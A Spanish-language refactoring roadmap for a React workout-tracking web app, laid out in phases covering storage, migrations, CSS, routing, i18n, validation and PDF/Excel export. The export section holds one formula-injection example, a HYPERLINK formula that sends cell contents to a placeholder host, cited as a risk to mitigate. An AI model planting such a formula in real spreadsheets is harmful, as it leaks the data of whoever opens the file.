# Plan por fases

De donde sale este plan: una auditoria de 6 lentes sobre el codigo (117 hallazgos),
de los que los 24 mas graves pasaron por verificacion adversarial. Sobrevivieron 19.
El estado de avance esta en [roadmap.md](roadmap.md); aqui esta el contenido.

Las fases van en este orden porque cada una desbloquea la siguiente. Se pueden
reordenar las visuales (4) y las de funcionalidad (6, 8), pero **la 2 va antes que
todo lo demas**: validacion, PDF y Excel necesitan leer datos sin montar un hook de
React, y hoy no existe ningun sitio desde donde hacerlo.

| Fase | Nombre                                 | Riesgo | Rompe algo | Toca muchos archivos  |
| ---- | -------------------------------------- | ------ | ---------- | --------------------- |
| 0    | Limpieza y suelo firme                 | Nulo   | No         | No                    |
| 1    | Alias de importacion                   | Bajo   | No         | Solo lineas de import |
| 2    | Capa de dominio y almacenamiento       | Alto   | Si         | Si                    |
| 3    | Renombrado a `routines` y migracion v3 | Alto   | Si         | Si                    |
| 4    | ITCSS, BEMIT y tokens                  | Alto   | Si         | Si                    |
| 5    | Enrutado y pagina de ajustes           | Medio  | Si         | Si                    |
| 6    | Internacionalizacion                   | Medio  | Si         | Si                    |
| 7    | Validacion visible y accesibilidad     | Medio  | Parcial    | No                    |
| 8    | Exportacion a PDF y Excel              | Bajo   | No         | No                    |

---

## Fase 0 — Limpieza y suelo firme

**Completada.** Detalle en [roadmap.md](roadmap.md).

Borrar las 882 lineas del modulo de sesiones que nunca se monto, dejar el lint en
verde, e instalar Prettier, ESLint ampliado, Stylelint, husky, lint-staged y
commitlint. De paso salieron tres defectos reales que las herramientas destaparon:
el modal inaccesible, el area segura mal calculada en la barra inferior y una
propiedad CSS que no existe.

---

## Fase 1 — Alias de importacion

**Que hace.** Configurar `resolve.alias` en Vite, `jsconfig.json` para el editor y el
resolver de ESLint, y despues reescribir todas las rutas relativas profundas.

| Alias                                    | Apunta a                                   |
| ---------------------------------------- | ------------------------------------------ |
| `@domain/`                               | `src/domain/`                              |
| `@features/`                             | `src/features/` (solo hasta su `index.js`) |
| `@shared/`                               | `src/shared/`                              |
| `@services/`                             | `src/services/`                            |
| `@i18n/`, `@theme/`, `@styles/`, `@app/` | sus carpetas                               |

**Por que antes de mover carpetas.** Hoy hay imports como
`../../../shared/components/Modal/Modal`. Si se mueven las carpetas primero, cada
renombrado arrastra decenas de rutas rotas. Con alias, mover una carpeta no cambia
ni una linea de import.

**Por que importa mas alla de la comodidad.** Los alias son lo que permite que
ESLint imponga la direccion de las dependencias entre capas. Sin ellos no hay forma
de que una regla distinga "shared importa de domain" de "domain importa de shared".

---

## Fase 2 — Capa de dominio y almacenamiento

La fase central. Es la que cierra 7 de los 19 hallazgos confirmados.

**El problema.** No hay capa de datos. `useLocalStorage` es a la vez el repositorio,
la cache en memoria y el estado de React, y se instancia por componente: cada
consumidor guarda su propia copia completa del array y lo reescribe entero en cada
cambio.

**Que se crea.**

```
src/domain/          # nucleo puro. PROHIBIDO importar React
  catalogs/          # grupos musculares, equipamiento, colores. Solo ids
  model/             # createExercise, createRoutine, calculo de marcas
  schemas/           # la forma de cada entidad
  validation/        # validate, rules, normalize, parseDecimal, limits
  storage/
    keys.js          # manifiesto UNICO de claves de localStorage
    driver.js        # read/write que devuelven {ok, error}, nunca catch vacio
    repository.js    # valida al leer y al escribir
    integrity.js     # limpieza de exerciseIds huerfanos
    migrations/      # runner idempotente y verificado
```

**Los cuatro defectos que corrige, con su escenario real.**

1. **Migraciones que mienten.** `runMigrations` escribe `schemaVersion = CURRENT_VERSION`
   fuera de todo condicional. El dia que alguien suba la version a 3 y olvide anadir
   el bloque correspondiente, todos los usuarios quedan marcados como v3 sin que la
   transformacion se haya ejecutado. Como ya estan marcados, no volvera a correr
   jamas. El runner nuevo recorre un registro ordenado de migraciones, deriva
   `CURRENT_VERSION` de ese registro para que no puedan desincronizarse, sella la
   version dentro del bucle tras cada paso, y aborta si la version guardada es
   superior a la actual, para no degradar datos de un build mas nuevo.

2. **Escrituras que fallan en silencio.** Los tres `catch {}` vacios convierten un
   almacenamiento lleno o bloqueado (Safari privado, ITP) en una perdida invisible:
   el usuario ve datos que no se guardaron. `driver.js` devuelve `{ok, error}` y la
   interfaz avisa.

3. **Sin integridad referencial.** Borrar un ejercicio no toca las rutinas que lo
   referencian, asi que `exerciseIds` acumula basura para siempre. La interfaz lo
   oculta con un `.filter(Boolean)` repetido en cada componente, de modo que el
   usuario nunca lo limpia. El exportador a Excel de la fase 8 lo sacaria a la luz
   como filas vacias.

4. **Dos pestanas se pisan.** El hook lee la clave una sola vez y escribe el array
   entero en cada cambio, sin escuchar el evento `storage`. Escenario medido: la PWA
   instalada y la app en una pestana. En la pestana hay 20 ejercicios en memoria; en
   la PWA se anaden 3. Al volver a la pestana y corregir un peso, se serializan sus
   20 y se escriben encima. Los 3 desaparecen sin aviso.

**Ademas.** `ErrorBoundary` y una pantalla de recuperacion, porque hoy un dato
malformado deja la pantalla en blanco sin forma de exportar nada antes de tocarlo.

---

## Fase 3 — Renombrado a `routines` y migracion v3

**El problema.** El mismo concepto se llama de cuatro formas: la carpeta dice
`workout-days`, el archivo dice `RoutinesPage.jsx`, el bloque CSS dice
`.routines-page`, el hook dice `useWorkoutDays` y la clave dice
`lomito-train-workout-days`. Con i18n a punto de entrar, ese concepto tendria ademas
dos claves de traduccion posibles.

**Que cambia en los datos.**

| Hoy                                           | v3                       | Por que                                                                                                                                                       |
| --------------------------------------------- | ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `muscleGroup` (string) + `categories` (array) | `muscleGroupIds` (array) | Es el mismo dato duplicado. El usuario selecciona tres grupos, ve el contador "(3)", y la tarjeta pinta solo uno: los otros dos son invisibles en toda la app |
| `equipment`                                   | `equipmentId`            | Ademas se corrige que hoy se descarta al crear un ejercicio y solo cuaja al editarlo                                                                          |
| `color` en hexadecimal                        | `colorId`                | Un hex guardado en localStorage no puede adaptarse al tema oscuro                                                                                             |
| `lomito-train-workout-days`                   | `lomito-train-routines`  | Vocabulario unico                                                                                                                                             |
| `lomito-train-sessions`, `-active-session`    | borradas                 | El modulo ya no existe                                                                                                                                        |

La migracion valida los ids contra el catalogo, deduplica `exerciseIds`, elimina los
huerfanos, y **verifica que puede leer la clave nueva antes de borrar la vieja**.

**Tambien.** `updateWorkoutDay` existe pero es codigo inalcanzable: no hay ninguna
via para renombrar o recolorear una rutina. La unica salida es borrarla y recrearla,
perdiendo su lista de ejercicios. Se conecta.

---

## Fase 4 — ITCSS, BEMIT y tokens

**El problema, con numeros.** 28 archivos SCSS sin ninguna capa. El bloque `:root`
de `_variables.scss` lo hacen `@use` 23 hojas de estilo, y como Vite compila cada
`.scss` co-locado por separado, **ese bloque se emite 23 veces en el bundle final**.
Hay 19 hex y 64 `rgba()` literales incrustados en los componentes, incluidos colores
huerfanos de una paleta anterior. El fondo de la aplicacion esta hardcodeado en el
reset, divergido de los tokens `--orb-*` que deberian describirlo: tres fuentes de
verdad contradictorias para lo mismo.

**Las siete capas**, centralizadas en `src/styles/` salvo la de componentes, que se
queda junto al `.jsx`. El orden de cascada se garantiza con `@layer` nativo de CSS,
no con el orden de importacion, que hoy es no determinista entre dev y build.

**BEMIT.** `ExerciseCard.jsx` usa `_exercise-card.scss` y su bloque es
`.c-exercise-card`. Prefijos `o-`, `c-`, `u-`, `is-`/`has-`, `js-`. Hay que renombrar
los bloques que no coinciden con su componente, empezando por `.routine-ex-card`.

**Tokens en dos niveles.** Primitivos inmutables (la escala de color cruda) y
semanticos conmutables (`--color-bg`, `--color-surface`, `--color-text`,
`--color-accent`). El tema se cambia reasignando solo los semanticos. Es la unica
arquitectura que hace posible el tema oscuro: hoy 284 valores de color estan
escritos como variables Sass, que se resuelven en tiempo de compilacion y no pueden
cambiar en runtime.

La paleta completa, con los contrastes medidos, esta en [styles.md](styles.md).

---

## Fase 5 — Enrutado y pagina de ajustes

**El problema.** No hay router. El detalle de una rutina es un `useState` local, asi
que el boton atras del movil sale de la aplicacion en vez de volver al listado, y un
refresco pierde donde estabas.

**Que se anade.** `react-router` con `createHashRouter` (hosting estatico, sin
reescrituras de servidor) y las rutas `/routines`, `/routines/:routineId`,
`/exercises`, `/exercises/:exerciseId`, `/settings`.

**Por que no es opcional.** La pagina de ajustes es donde viven el selector de
idioma, el de tema y los botones de exportar. Y "exportar **esta** rutina a PDF"
necesita una URL que identifique cual.

---

## Fase 6 — Internacionalizacion

**El inventario.** ~150 cadenas hardcodeadas en espanol repartidas por 38 archivos,
incluidos `aria-label`, placeholders, titulos de modal y las etiquetas de los
catalogos.

**La decision, medida.** Solucion propia: React Context, diccionarios JSON por
namespace y un hook `useTranslation()`, apoyada en `Intl.PluralRules`,
`Intl.NumberFormat` e `Intl.DateTimeFormat`.

| Opcion                  | Dependencias     | Coste gzip | Sobre el bundle actual |
| ----------------------- | ---------------- | ---------- | ---------------------- |
| **Propia**              | 0                | ~1,2 kB    | **+1,7%**              |
| i18next + react-i18next | 2                | ~21 kB     | +29%                   |
| react-intl              | 1 (+transitivas) | ~45 kB     | +63%                   |

Medido contra los 71.864 bytes gzip que pesa hoy el bundle. Para dos idiomas, sin
SSR y sin ICU, las 200 lineas propias hacen el mismo trabajo.

**Las trampas que un i18n ingenuo rompe** y que estan resueltas por diseno:
pluralizacion (`1 ejercicio` / `N ejercicios` se resuelve con `Intl.PluralRules`,
nunca con un ternario), fechas (hoy hay un `Intl.DateTimeFormat('es')` con el locale
fijo), separador decimal del peso, y las etiquetas de catalogo, que hoy mezclan
datos y presentacion: `equipment.js` tiene etiquetas en espanol **y** emojis,
mientras que `muscleGroups.js` las tiene en ingles.

Detalle en [i18n.md](i18n.md).

---

## Fase 7 — Validacion visible y accesibilidad

**El problema.** No hay capa de validacion: solo dos `name.trim()` y dos guardas
`isNaN` sueltas.

**El defecto mas grave de toda la auditoria.** Los inputs de peso y repeticiones
corrompen el dato a 0 sin ningun aviso. Escenario reproducible: en un teclado
espanol el usuario escribe `22,5` en Peso. El navegador entrega `value = ''`, el
codigo hace `num = 0` y persiste `weight: 0`, **mientras el input sigue mostrando
`22,5` en pantalla**. El usuario cree que guardo 22,5 kg y en localStorage hay un 0.
La marca del ejercicio pasa a "Sin record aun". Esto ocurre en el nucleo del
producto: anotar cuanto levantas.

La correccion: el input conserva la cadena cruda mientras se escribe, y
`parseDecimal` acepta coma y punto.

**Los limites**, hoy inexistentes: nombre de 1 a 60 caracteres normalizado, peso de
0 a 1000 en multiplos de 0,25, repeticiones enteras de 0 a 500, al menos un grupo
muscular. Hoy se puede guardar 999999 kg y repeticiones decimales.

**Accesibilidad pendiente.** El swipe de las tarjetas no maneja `touchcancel`: si el
usuario empieza a arrastrar y luego baja para hacer scroll, la tarjeta se queda
congelada con el fondo rojo "Eliminar" visible, y el siguiente toque dispara la
accion. Ademas `preventDefault()` dentro de `onTouchMove` no tiene efecto, porque
React registra ese evento como pasivo. Y toda accion que hoy solo existe deslizando
necesita una alternativa por teclado.

Detalle en [validation.md](validation.md).

---

## Fase 8 — Exportacion a PDF y Excel

**PDF de la rutina.** jsPDF + jspdf-autotable, con carga diferida por `import()`.

| Opcion                | Peso gzip   | Veredicto                                                                                     |
| --------------------- | ----------- | --------------------------------------------------------------------------------------------- |
| **jsPDF + autotable** | ~130 KB     | Recomendada                                                                                   |
| pdfmake               | ~750 KB     | 5,7 veces mas peso para resolver Unicode no latino, que este producto no tiene                |
| @react-pdf/renderer   | ~600-900 KB | El mas pesado y encima obliga a montar la tabla a mano                                        |
| `window.print()`      | 0 KB        | El navegador mete su URL, su fecha y su paginacion en el papel, y no respeta el idioma activo |

El documento lleva la rutina con sus ejercicios, grupo muscular, y **casillas vacias
para anotar en el gimnasio**. Respeta el idioma activo pero nunca el tema oscuro: el
papel es siempre blanco.

**Excel.** exceljs, tambien diferido, con un exportador CSV de cero dependencias
como respaldo para cuando no hay red y el chunk no se descarga.

SheetJS queda descartada por cadena de suministro: la ultima version en npm es de
2022 y arrastra dos CVE cuyas correcciones **no estan en npm**, porque la
distribucion oficial se movio a un CDN propio. Fijar una URL de tarball en
`package.json` anula `npm audit`, rompe Dependabot y hace fallar `npm ci` sin red.

**Cuatro problemas tratados explicitamente**, cada uno con su mitigacion: el BOM
UTF-8 y el delimitador por locale (en un Windows espanol el separador de lista es
`;`, asi que un CSV con comas cae entero en la columna A), las fechas como fecha
real y no como texto, los numeros crudos sin localizar en XLSX (localizarlos rompe
toda suma o grafica), y la **inyeccion de formulas**: hoy nada impide llamar a una
rutina `=HYPERLINK("https://ejemplo/?d="&A2,"Abrir")`, que al abrir el fichero
exfiltra el contenido de otras celdas. La unica validacion actual es `name.trim()`.

Detalle en [export.md](export.md).

---

## Que se decidio no hacer

| Descartado                                   | Por que                                                                                              |
| -------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| TypeScript                                   | La validacion en runtime de la fase 2 cubre el contrato, y migrar 56 archivos no entra en el alcance |
| Tests automatizados                          | No hay ninguno hoy. Merece su propia decision, no colarse de rondon en una migracion                 |
| `AUTHORS`, `CODEOWNERS`, etiquetas `@author` | Con un solo autor son ficcion administrativa. `git log` es mas preciso                               |
| Hook `pre-push` con build                    | 10-20 segundos por push para detectar lo que un CI detecta igual sin bloquear                        |
| commitizen                                   | Para un autor que ya conoce la convencion, el formulario es mas lento que teclear                    |
